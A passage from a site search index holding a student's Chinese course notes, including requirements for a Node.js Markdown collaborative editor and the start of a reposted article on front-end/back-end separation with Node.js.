\u5728\u8001\u62a5\u544a\u7684\u57fa\u7840\u4e0a\uff0c\u6bcf\u4e2a\u540c\u5b66\u90fd\u53ef\u4ee5\u628a\u8001\u62a5\u544a\u5bfc\u51fa\uff0c\u7136\u540e\u5728\u8001\u62a5\u544a\u7684\u57fa\u7840\u4e0a\u4fee\u6539\uff0c\u4fee\u6539\u540e\u7136\u540e\u63d0\u4ea4\u3002\u5f53\u6bcf\u4e2a\u540c\u5b66\u90fd\u628a\u62a5\u544a\u63d0\u4ea4\u5b8c\u540e\u3002\u7136\u540e\u6574\u5408\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u6587\u6863\u3002\u5728\u6574\u5408\u7684\u6587\u6863\u4e2d\uff0c\u6807\u51fa\u6bcf\u6bb5\u6587\u5b57\u662f\u8001\u6587\u6863\u4e2d\u7684\u8fd8\u662f\u7531\u54ea\u4e2a\u540c\u5b66\u4fee\u6539\u7684\u3002 \u62a5\u544a\u7684\u8d21\u732e\u7edf\u8ba1 \u80fd\u591f\u7edf\u8ba1\u6bcf\u4e2a\u4eba\u5bf9\u6587\u6863\u4fee\u6539\u7684\u8d21\u732e\uff0c\u5982\u4fee\u6539\u6587\u6863\u88ab\u63a5\u53d7\u7684\u6bd4\u4f8b\u3002 \u62a5\u544a\u67e5\u770b \u6bcf\u4e2a\u4eba\u53ef\u4ee5\u67e5\u770b\u81ea\u5df1\u63d0\u4ea4\u7684\u62a5\u544a\u3001\u672c\u7ec4\u5176\u4ed6\u6210\u5458\u63d0\u4ea4\u7684\u62a5\u544a 2.3. \u62d3\u5c55\u9700\u6c42 # \u5b9e\u65f6\u534f\u540c\u7f16\u8f91 \u5e73\u53f0\u652f\u6301\u591a\u4e2a\u7528\u6237\u540c\u65f6\u7f16\u8f91\u540c\u4e00\u4efd\u6587\u6863\uff0c\u7ed3\u679c\u5b9e\u65f6\u540c\u6b65\u3002 Markdown \u7f16\u8f91 \u6587\u6863\u80fd\u591f\u4f7f\u7528 Markdown \u8bed\u6cd5\u8fdb\u884c\u7f16\u8f91\uff0c\u9875\u9762\u5de6\u534a\u8fb9\u4e3a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u53f3\u534a\u8fb9\u8fdb\u884c\u5b9e\u65f6\u6e32\u67d3\u3002 \u56fe\u7247\u4e0a\u4f20\u529f\u80fd \u7528\u6237\u53ef\u4ee5\u5c06\u672c\u5730\u56fe\u7247\u4e0a\u4f20\uff0c\u7531\u670d\u52a1\u5668\u81ea\u52a8\u4f20\u5230\u56fe\u5e8a\u4e2d\uff0c\u65b9\u4fbf Markdown \u6587\u672c\u7684\u4f20\u64ad\u4e0e\u5206\u4eab\u3002 \u6587\u6863\u5206\u4eab\u529f\u80fd \u652f\u6301\u7528\u6237\u751f\u6210\u5728\u7ebf\u5206\u4eab\u9875\u9762\uff0c\u4ed6\u4eba\u53ef\u4ee5\u901a\u8fc7\u94fe\u63a5\u770b\u5230\u6700\u65b0\u7248\u672c\u7684\u6587\u6863\uff0c\u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u53c2\u4e0e\u8005\u662f\u5426\u5177\u5907\u7f16\u8f91\u6743\u9650\u3002 PPT\u5206\u4eab\u529f\u80fd \u652f\u6301\u7528\u6237\u901a\u8fc7 reveal.js \u683c\u5f0f\u5c06Markdown\u8f6c\u6362\u4e3a\u5728\u7ebfPPT\uff0c\u5e76\u540c\u6b65\u5206\u4eab\u7ed9\u89c2\u770b\u8005\u3002 3. \u7cfb\u7edf\u529f\u80fd\u6a21\u5757\u56fe # \u5982 \u56fe1 \u6240\u793a\uff0c\u6211\u4eec\u6839\u636e\u529f\u80fd\u5c06\u7cfb\u7edf\u5212\u5206\u4e3a\u4e86 4 \u4e2a\u5b50\u7cfb\u7edf\uff0c\u5171 14 \u4e2a\u529f\u80fd\u6a21\u5757\u3002 \\text{Figure 1. \u529f\u80fd\u6a21\u5757\u56fe} 4. ER \u56fe # \u6211\u4eec\u91c7\u7528\u7684\u6570\u636e\u5e93\u4e3a PostgreSQL \uff0c\u7528\u4ee5\u652f\u6301\u66f4\u52a0\u7075\u6d3b\u7684\u6587\u672c\u5b58\u50a8\u3002 \u5982 \u56fe2 \u6240\u793a\uff0c\u4e3a\u4e86\u652f\u6301\u66f4\u9ad8\u7684\u5e76\u53d1\u7528\u6237\u6570\u91cf\uff0c\u6211\u4eec\u6ca1\u6709\u5728\u6570\u636e\u5e93\u8bbe\u7f6e\u5916\u952e\u7ea6\u675f\uff0c\u5916\u952e\u7684\u68c0\u67e5\u5728\u5e94\u7528\u5c42\u89e3\u51b3\u3002 \\text{Figure 2. ER Diagram}","title":"2.\u9700\u6c42\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#cumd","text":"","title":"CuMd \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u9700\u6c42\u5206\u6790"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#_1","text":"CuMd \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u9700\u6c42\u5206\u6790 \u76ee\u5f55 1. \u80cc\u666f 2. \u9700\u6c42\u63cf\u8ff0 2.1. \u9879\u76ee\u63cf\u8ff0 2.2. \u57fa\u672c\u9700\u6c42 2.3. \u62d3\u5c55\u9700\u6c42 3. \u7cfb\u7edf\u529f\u80fd\u6a21\u5757\u56fe 4. ER \u56fe","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#1","text":"\u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u77ed\u5b66\u671f\u8bfe\u7a0b\uff0c\u300a\u8ba1\u7b97\u673a\u4e13\u4e1a\u8bfe\u7a0b\u8bbe\u8ba1\u300b\uff0c\u6211\u4eec\u9700\u8981\u5355\u72ec\u5b8c\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u9879\u76ee\u5e76\u6c47\u62a5\u7ed9\u8001\u5e08\u3002\u6211\u51c6\u5907\u501f\u9274 CodiMD \u6765\u5b9e\u73b0\u4e00\u4e2a\u57fa\u4e8e Node.js \u7684 MarkDown \u6587\u6863\u534f\u540c\u7f16\u8f91\u5e73\u53f0\u3002 \u8fd9\u7bc7\u7b14\u8bb0\u662f\u9879\u76ee\u7684\u9700\u6c42\u5206\u6790\u6587\u6863\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#2","text":"","title":"2. \u9700\u6c42\u63cf\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#21","text":"\u5728\u8f6f\u4ef6\u8bbe\u8ba1\u3001\u9700\u6c42\u5206\u6790\u3001\u8f6f\u4ef6\u8bbe\u8ba1\u7684\u62a5\u544a\u64b0\u5199\u4e0e\u4fee\u6539\u4e2d\uff0c\u5e38\u9700\u8981\u591a\u4e2a\u540c\u5b66\u5728\u540c\u4e00\u4e2a\u6587\u6863\u4e0a\u8fdb\u884c\u64b0\u5199\u3001\u4fee\u6539\u3001\u5b8c\u5584\u3002\u7136\u540e\u628a\u5404\u540c\u5b66\u5bf9\u540c\u4e00\u4e2a\u6587\u6863\u7684\u4fee\u6539\u5408\u6210\u4e00\u4e2a\u6587\u6863\u3002\u672c\u9879\u76ee\u8981\u6c42\u8bbe\u8ba1\u4e00\u4e2a\u6587\u6863\u534f\u540c\u7f16\u8f91\u7cfb\u7edf","title":"2.1. \u9879\u76ee\u63cf\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#22","text":"\u62a5\u544a\u7684\u521d\u59cb\u5212\u5206 \u6bcf\u4e2a\u540c\u5b66\u64b0\u5199\u67d0\u4e2a\u62a5\u544a\u4e2d\u7684\u4e00\u90e8\u5206\uff0c\u64b0\u5199\u62a5\u544a\u7247\u6bb5\uff0c\u7136\u540e\u63d0\u4ea4\u62a5\u544a\u7247\u6bb5 \u62a5\u544a\u7684\u6574\u5408 \u7cfb\u7edf\u63d0\u4f9b\u6574\u5408\u6309\u94ae\uff0c\u628a\u6bcf\u4e2a\u540c\u5b66\u63d0\u4ea4\u7684\u62a5\u544a\u6574\u5408\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u62a5\u544a\u3002 \u4fee\u6539\u8001\u62a5\u544a \u5728\u8001\u62a5\u544a\u7684\u57fa\u7840\u4e0a\uff0c\u6bcf\u4e2a\u540c\u5b66\u90fd\u53ef\u4ee5\u628a\u8001\u62a5\u544a\u5bfc\u51fa\uff0c\u7136\u540e\u5728\u8001\u62a5\u544a\u7684\u57fa\u7840\u4e0a\u4fee\u6539\uff0c\u4fee\u6539\u540e\u7136\u540e\u63d0\u4ea4\u3002\u5f53\u6bcf\u4e2a\u540c\u5b66\u90fd\u628a\u62a5\u544a\u63d0\u4ea4\u5b8c\u540e\u3002\u7136\u540e\u6574\u5408\u4e3a\u4e00\u4e2a\u5b8c\u6574\u7684\u6587\u6863\u3002\u5728\u6574\u5408\u7684\u6587\u6863\u4e2d\uff0c\u6807\u51fa\u6bcf\u6bb5\u6587\u5b57\u662f\u8001\u6587\u6863\u4e2d\u7684\u8fd8\u662f\u7531\u54ea\u4e2a\u540c\u5b66\u4fee\u6539\u7684\u3002 \u62a5\u544a\u7684\u8d21\u732e\u7edf\u8ba1 \u80fd\u591f\u7edf\u8ba1\u6bcf\u4e2a\u4eba\u5bf9\u6587\u6863\u4fee\u6539\u7684\u8d21\u732e\uff0c\u5982\u4fee\u6539\u6587\u6863\u88ab\u63a5\u53d7\u7684\u6bd4\u4f8b\u3002 \u62a5\u544a\u67e5\u770b \u6bcf\u4e2a\u4eba\u53ef\u4ee5\u67e5\u770b\u81ea\u5df1\u63d0\u4ea4\u7684\u62a5\u544a\u3001\u672c\u7ec4\u5176\u4ed6\u6210\u5458\u63d0\u4ea4\u7684\u62a5\u544a","title":"2.2. \u57fa\u672c\u9700\u6c42"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#23","text":"\u5b9e\u65f6\u534f\u540c\u7f16\u8f91 \u5e73\u53f0\u652f\u6301\u591a\u4e2a\u7528\u6237\u540c\u65f6\u7f16\u8f91\u540c\u4e00\u4efd\u6587\u6863\uff0c\u7ed3\u679c\u5b9e\u65f6\u540c\u6b65\u3002 Markdown \u7f16\u8f91 \u6587\u6863\u80fd\u591f\u4f7f\u7528 Markdown \u8bed\u6cd5\u8fdb\u884c\u7f16\u8f91\uff0c\u9875\u9762\u5de6\u534a\u8fb9\u4e3a\u6587\u672c\u7f16\u8f91\u5668\uff0c\u53f3\u534a\u8fb9\u8fdb\u884c\u5b9e\u65f6\u6e32\u67d3\u3002 \u56fe\u7247\u4e0a\u4f20\u529f\u80fd \u7528\u6237\u53ef\u4ee5\u5c06\u672c\u5730\u56fe\u7247\u4e0a\u4f20\uff0c\u7531\u670d\u52a1\u5668\u81ea\u52a8\u4f20\u5230\u56fe\u5e8a\u4e2d\uff0c\u65b9\u4fbf Markdown \u6587\u672c\u7684\u4f20\u64ad\u4e0e\u5206\u4eab\u3002 \u6587\u6863\u5206\u4eab\u529f\u80fd \u652f\u6301\u7528\u6237\u751f\u6210\u5728\u7ebf\u5206\u4eab\u9875\u9762\uff0c\u4ed6\u4eba\u53ef\u4ee5\u901a\u8fc7\u94fe\u63a5\u770b\u5230\u6700\u65b0\u7248\u672c\u7684\u6587\u6863\uff0c\u7528\u6237\u53ef\u4ee5\u8bbe\u7f6e\u53c2\u4e0e\u8005\u662f\u5426\u5177\u5907\u7f16\u8f91\u6743\u9650\u3002 PPT\u5206\u4eab\u529f\u80fd \u652f\u6301\u7528\u6237\u901a\u8fc7 reveal.js \u683c\u5f0f\u5c06Markdown\u8f6c\u6362\u4e3a\u5728\u7ebfPPT\uff0c\u5e76\u540c\u6b65\u5206\u4eab\u7ed9\u89c2\u770b\u8005\u3002","title":"2.3. \u62d3\u5c55\u9700\u6c42"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#3","text":"\u5982 \u56fe1 \u6240\u793a\uff0c\u6211\u4eec\u6839\u636e\u529f\u80fd\u5c06\u7cfb\u7edf\u5212\u5206\u4e3a\u4e86 4 \u4e2a\u5b50\u7cfb\u7edf\uff0c\u5171 14 \u4e2a\u529f\u80fd\u6a21\u5757\u3002 \\text{Figure 1. \u529f\u80fd\u6a21\u5757\u56fe}","title":"3. \u7cfb\u7edf\u529f\u80fd\u6a21\u5757\u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/2.%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90/#4-er","text":"\u6211\u4eec\u91c7\u7528\u7684\u6570\u636e\u5e93\u4e3a PostgreSQL \uff0c\u7528\u4ee5\u652f\u6301\u66f4\u52a0\u7075\u6d3b\u7684\u6587\u672c\u5b58\u50a8\u3002 \u5982 \u56fe2 \u6240\u793a\uff0c\u4e3a\u4e86\u652f\u6301\u66f4\u9ad8\u7684\u5e76\u53d1\u7528\u6237\u6570\u91cf\uff0c\u6211\u4eec\u6ca1\u6709\u5728\u6570\u636e\u5e93\u8bbe\u7f6e\u5916\u952e\u7ea6\u675f\uff0c\u5916\u952e\u7684\u68c0\u67e5\u5728\u5e94\u7528\u5c42\u89e3\u51b3\u3002 \\text{Figure 2. ER Diagram}","title":"4. ER \u56fe"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E8%BD%AF%E4%BB%B6%E5%8D%8F%E5%90%8C%E8%AE%BE%E8%AE%A1/1.%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E7%9A%84%E6%80%9D%E8%80%83%E4%B8%8E%E5%AE%9E%E8%B7%B5/","text":"\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\uff08\u4e00\uff09 # \u4e5f\u8c08\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\uff08\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\uff09 # \u76ee\u5f55 # \u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\uff08\u4e00\uff09 \u4e5f\u8c08\u57fa\u4e8e Node.js \u7684\u5168\u6808\u5f0f\u5f00\u53d1\uff08\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\uff09 \u76ee\u5f55 \u80cc\u666f \u524d\u8a00 1. \u4ec0\u4e48\u662f\u524d\u540e\u7aef\u5206\u79bb 2. \u4e3a\u4ec0\u4e48\u8981\u524d\u540e\u7aef\u5206\u79bb 2.1. \u73b0\u6709\u5f00\u53d1\u6a21\u5f0f\u7684\u9002\u7528\u573a\u666f 2.2. \u524d\u540e\u7aef\u804c\u8d23\u4e0d\u6e05 2.3. \u5f00\u53d1\u6548\u7387\u95ee\u9898 2.4. \u5bf9\u524d\u7aef\u53d1\u6325\u7684\u5c40\u9650 3. \u600e\u4e48\u505a\u524d\u540e\u7aef\u5206\u79bb 3.1. \u57fa\u4e8eNodeJS\u201c\u5168\u6808\u201d\u5f0f\u5f00\u53d1 3.2. \u4e3a\u4ec0\u4e48\u8981\u589e\u52a0\u4e00\u5c42 Node.js 3.3. \u6027\u80fd\u95ee\u9898 3.4. \u524d\u7aef\u7684\u5de5\u4f5c\u91cf\u662f\u5426\u589e\u52a0\u4e86 3.5. \u589e\u52a0 Node.js \u5c42\u5e26\u6765\u7684\u98ce\u9669\u600e\u4e48\u63a7\u5236 3.6. Node.js \u4ec0\u4e48\u90fd\u80fd\u505a\uff0c\u4e3a\u4ec0\u4e48\u8fd8\u8981 Java 4. \u6dd8\u5b9d\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb 5. \u6211\u4eec\u8fd8\u9700\u8981\u8981\u505a\u4ec0\u4e48 6. \u201c\u4e2d\u9014\u5c9b\u201d \u80cc\u666f # \u8fd9\u5b66\u671f\u9009\u4fee\u4e86\u4e00\u95e8\u8bfe\u300a\u8f6f\u4ef6\u534f\u540c\u8bbe\u8ba1\u300b\uff0c\u8fd9\u95e8\u8bfe\u4e3b\u8981\u7684\u76ee\u7684\uff0c\u5c31\u662f\u8ba9\u6211\u4eec\u80fd\u591f\u5728\u5b66\u6821\u91cc\u62e5\u6709\u901a\u8fc7\u56e2\u961f\u5408\u4f5c\u5f00\u53d1\u4e00\u4e2a\u4ea7\u54c1\u7684\u7ecf\u9a8c\u3002\u4e00\u4e2a\u5c0f\u7ec45\u4e2a\u4eba\uff0c\u4ece\u9700\u6c42\u5206\u6790\u3001\u8f6f\u4ef6\u5f00\u53d1\u3001\u6d4b\u8bd5\u5230\u4ea4\u4ed8\u7684\u8fc7\u7a0b\u6211\u4eec\u90fd\u4f1a\u7ecf\u5386\u3002 \u6211\u5728\u601d\u8003\u6211\u4eec\u5e94\u8be5\u7528\u4ec0\u4e48\u6837\u7684\u6280\u672f\u6765\u505a\u8fd9\u4e2a\u9879\u76ee\u7684\u65f6\u5019\u9047\u5230\u4e86\u4e00\u4e9b\u95ee\u9898\u3002 \u6211\u4eec\u719f\u6089\u7684\u6280\u672f\uff0c\u53ea\u6709\u5728\u4e0a\u5b66\u671f\u505aJavaWeb\u5f00\u53d1\u7684\u65f6\u5019\u7528\u5230\u7684JSP + Servlet\u3002\u4f46\u6211\u611f\u89c9\u8fd9\u4e2a\u67b6\u6784\u65e0\u8bba\u662f\u5728\u524d\u7aef\u548c\u670d\u52a1\u7aef\u7684\u4ea4\u4e92\u4e0a\uff0c\u8fd8\u662f\u5728\u670d\u52a1\u7aef\u548c\u6570\u636e\u5e93\u7684\u4ea4\u4e92\u4e0a\u90fd\u975e\u5e38\u5730\u9ebb\u70e6\u3002 \u4e8e\u662f\u6211\u5e0c\u671b\u80fd\u591f\u4e86\u89e3\u76ee\u524d\u4e92\u8054\u7f51\u4f01\u4e1a\u5e38\u7528\u7684\u4e00\u4e9b\u524d\u540e\u7aef\u6280\u672f\uff0c\u5728\u6211\u7684\u641c\u7d22\u8fc7\u7a0b\u4e2d\uff0c\u6211\u53d1\u73b0 \u524d\u540e\u7aef\u5206\u79bb \u548c Node.js \u8fd9\u4e24\u4e2a\u5173\u952e\u8bcd\u7ecf\u5e38\u51fa\u73b0\uff0c\u4f46\u6211\u5e76\u4e0d\u7406\u89e3\u5b83\u4eec\u662f\u4ec0\u4e48\u3002 \u6240\u4ee5\uff0c\u6211\u53c8\u5bf9\u8fd9\u4e24\u4e2a\u5173\u952e\u8bcd\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u6700\u7ec8\u627e\u5230\u4e86\u963f\u91cc\u5df4\u5df4 \u6dd8\u7cfb\u524d\u7aef\u56e2\u961f \u6240\u5199\u7684\u6587\u7ae0 \u300a\u524d\u540e\u7aef\u5206\u79bb\u7684\u601d\u8003\u4e0e\u5b9e\u8df5\u300b \uff0c\u5b83\u8ba9\u6211\u5bf9\u524d\u540e\u7aef\u5206\u79bb\u4e5f\u6709\u4e86\u4e00\u4e9b\u4e86\u89e3\uff0c\u4e8e\u662f\u6211\u60f3\u8981\u8f6c\u8f7d\u8fc7\u6765\uff0c\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\u3002 \u8fd9\u4e2a\u7cfb\u5217\u7684\u6587\u7ae0\u4e00\u5171\u67096\u4e2a\u7ae0\u8282\uff0c\u4ee5\u4e0b\u662f\u5bf9 \u7b2c\u4e00\u7ae0 \u7684\u5168\u6587\u8f6c\u8f7d\u3002 \u524d\u8a00 # \u4e3a\u4e86\u89e3\u51b3\u4f20\u7edf Web \u5f00\u53d1\u6a21\u5f0f\u5e26\u6765\u7684\u5404\u79cd\u95ee\u9898\uff0c\u6211\u4eec\u8fdb\u884c\u4e86\u8bb8\u591a\u5c1d\u8bd5\uff0c\u4f46\u7531\u4e8e\u524d/\u540e\u7aef\u7684\u7269\u7406\u9e3f\u6c9f\uff0c\u5c1d\u8bd5\u7684\u65b9\u6848\u90fd\u5927\u540c\u5c0f\u5f02\u3002\u75db\u5b9a\u601d\u75db\uff0c\u4eca\u5929\u6211\u4eec\u91cd\u65b0\u601d\u8003\u4e86\u201c\u524d\u540e\u7aef\u201d\u7684\u5b9a\u4e49\uff0c\u5f15\u5165\u524d\u7aef\u540c\u5b66\u90fd\u719f\u6089\u7684 Node.js\uff0c\u8bd5\u56fe\u63a2\u7d22\u4e00\u6761\u5168\u65b0\u7684\u524d\u540e\u7aef\u5206\u79bb\u6a21\u5f0f\u3002 \u968f\u7740\u4e0d\u540c\u7ec8\u7aef\uff08Pad/Mobile/PC\uff09\u7684\u5174\u8d77\uff0c\u5bf9\u5f00\u53d1\u4eba\u5458\u7684\u8981\u6c42\u8d8a\u6765\u8d8a\u9ad8\uff0c\u7eaf\u6d4f\u89c8\u5668\u7aef\u7684\u54cd\u5e94\u5f0f\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u4f53\u9a8c\u7684\u9ad8\u8981\u6c42\uff0c\u6211\u4eec\u5f80\u5f80\u9700\u8981\u9488\u5bf9\u4e0d\u540c\u7684\u7ec8\u7aef\u5f00\u53d1\u5b9a\u5236\u7684\u7248\u672c\u3002\u4e3a\u4e86\u63d0\u5347\u5f00\u53d1\u6548\u7387\uff0c\u524d\u540e\u7aef\u5206\u79bb\u7684\u9700\u6c42\u8d8a\u6765\u8d8a\u88ab\u91cd\u89c6\uff0c\u540e\u7aef\u8d1f\u8d23\u4e1a\u52a1/\u6570\u636e\u63a5\u53e3\uff0c\u524d\u7aef\u8d1f\u8d23\u5c55\u73b0/\u4ea4\u4e92\u903b\u8f91\uff0c\u540c\u4e00\u4efd\u6570\u636e\u63a5\u53e3\uff0c\u6211\u4eec\u53ef\u4ee5\u5b9a\u5236\u5f00\u53d1\u591a\u4e2a\u7248\u672c\u3002 \u8fd9\u4e2a\u8bdd\u9898\u6700\u8fd1\u88ab\u8ba8\u8bba\u5f97\u6bd4\u8f83\u591a\uff0c\u963f\u91cc\u6709\u4e9b BU \u4e5f\u5728\u8fdb\u884c\u4e00\u4e9b\u5c1d\u8bd5\u3002\u8ba8\u8bba\u4e86\u5f88\u4e45\u4e4b\u540e\uff0c\u6211\u4eec\u56e2\u961f\u51b3\u5b9a\u63a2\u7d22\u4e00\u5957\u57fa\u4e8e Node.js \u7684\u524d\u540e\u7aef\u5206\u79bb\u65b9\u6848\uff0c\u8fc7\u7a0b\u4e2d\u6709\u4e00\u4e9b\u4e0d\u65ad\u53d8\u5316\u7684\u8ba4\u8bc6\u4ee5\u53ca\u601d\u8003\uff0c\u8bb0\u5f55\u5728\u8fd9\u91cc\uff0c\u4e5f\u5e0c\u671b\u770b\u5230\u7684\u540c\u5b66\u53c2\u4e0e\u8ba8\u8bba\uff0c\u5e2e\u6211\u4eec\u5b8c\u5584\u3002 1. \u4ec0\u4e48\u662f\u524d\u540e\u7aef\u5206\u79bb # \u6700\u5f00\u59cb\u7ec4\u5185\u8ba8\u8bba\u7684\u8fc7\u7a0b\u4e2d\u6211\u53d1\u73b0\uff0c\u6bcf\u4e2a\u4eba\u5bf9\u524d\u540e\u7aef\u5206\u79bb\u7684\u7406\u89e3\u4e0d\u4e00\u6837\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u80fd\u5728\u540c\u4e00\u4e2a\u9891\u9053\u8ba8\u8bba\uff0c\u5148\u5c31\u4ec0\u4e48\u662f\u201d\u524d\u540e\u7aef\u5206\u79bb\u201d\u8fbe\u6210\u4e00\u81f4\u3002 \u5927\u5bb6\u4e00\u81f4\u8ba4\u540c\u7684\u524d\u540e\u7aef\u5206\u79bb\u7684\u4f8b\u5b50\u5c31\u662f SPA(Single Page Application)\uff0c\u6240\u6709\u7528\u5230\u7684\u5c55\u73b0\u6570\u636e\u90fd\u662f\u540e\u7aef\u901a\u8fc7\u5f02\u6b65\u63a5\u53e3\uff08AJAX/JSONP\uff09\u7684\u65b9\u5f0f\u63d0\u4f9b\u7684\uff0c\u524d\u7aef\u53ea\u7ba1\u5c55\u73b0\u3002 \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u6765\u8bf4\uff0cSPA \u786e\u5b9e\u505a\u5230\u4e86\u524d\u540e\u7aef\u5206\u79bb\uff0c\u4f46\u8fd9\u79cd\u65b9\u5f0f\u5b58\u5728\u4e24\u4e2a\u95ee\u9898\uff1a WEB \u670d\u52a1\u4e2d\uff0cSPA \u7c7b\u5360\u7684\u6bd4\u4f8b\u5f88\u5c11\u3002\u5f88\u591a\u573a\u666f\u4e0b\u8fd8\u6709\u540c\u6b65/\u540c\u6b65+\u5f02\u6b65\u6df7\u5408\u7684\u6a21\u5f0f\uff0cSPA \u4e0d\u80fd\u4f5c\u4e3a\u4e00\u79cd\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u3002 \u73b0\u9636\u6bb5\u7684 SPA \u5f00\u53d1\u6a21\u5f0f\uff0c\u63a5\u53e3\u901a\u5e38\u662f\u6309\u7167\u5c55\u73b0\u903b\u8f91\u6765\u63d0\u4f9b\u7684\uff0c\u6709\u65f6\u5019\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u540e\u7aef\u4f1a\u5e2e\u6211\u4eec\u5904\u7406\u4e00\u4e9b\u5c55\u73b0\u903b\u8f91\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u540e\u7aef\u8fd8\u662f\u6d89\u8db3\u4e86 View \u5c42\u7684\u5de5\u4f5c\uff0c\u4e0d\u662f\u771f\u6b63\u7684\u524d\u540e\u7aef\u5206\u79bb\u3002 SPA \u5f0f\u7684\u524d\u540e\u7aef\u5206\u79bb\uff0c\u662f\u4ece\u7269\u7406\u5c42\u505a\u533a\u5206\uff08\u8ba4\u4e3a\u53ea\u8981\u662f\u5ba2\u6237\u7aef\u7684\u5c31\u662f\u524d\u7aef\uff0c\u670d\u52a1\u5668\u7aef\u7684\u5c31\u662f\u540e\u7aef\uff09\uff0c\u8fd9\u79cd\u5206\u6cd5\u5df2\u7ecf\u65e0\u6cd5\u6ee1\u8db3\u6211\u4eec\u524d\u540e\u7aef\u5206\u79bb\u7684\u9700\u6c42\uff0c\u6211\u4eec\u8ba4\u4e3a\u4ece\u804c\u8d23\u4e0a\u5212\u5206\u624d\u80fd\u6ee1\u8db3\u76ee\u524d\u6211\u4eec\u7684\u4f7f\u7528\u573a\u666f\uff1a \u524d\u7aef\uff1a\u8d1f\u8d23 View \u548c Controller \u5c42\u3002 \u540e\u7aef\uff1a\u53ea\u8d1f\u8d23 Model \u5c42\uff0c\u4e1a\u52a1\u5904\u7406/\u6570\u636e\u7b49\u3002 \u4e3a\u4ec0\u4e48\u53bb\u505a\u8fd9\u79cd\u804c\u8d23\u7684\u5212\u5206\uff0c\u540e\u9762\u4f1a\u7ee7\u7eed\u63a2\u8ba8\u3002 2. \u4e3a\u4ec0\u4e48\u8981\u524d\u540e\u7aef\u5206\u79bb # \u5173\u4e8e\u8fd9\u4e2a\u95ee\u9898\uff0c\u7389\u4f2f\u7684\u6587\u7ae0 \u300aWeb \u7814\u53d1\u6a21\u5f0f\u6f14\u53d8\u300b \u4e2d\u89e3\u91ca\u5f97\u975e\u5e38\u5168\u9762\uff0c\u6211\u4eec\u518d\u5927\u6982\u7406\u4e00\u4e0b\uff1a 2.1. \u73b0\u6709\u5f00\u53d1\u6a21\u5f0f\u7684\u9002\u7528\u573a\u666f # 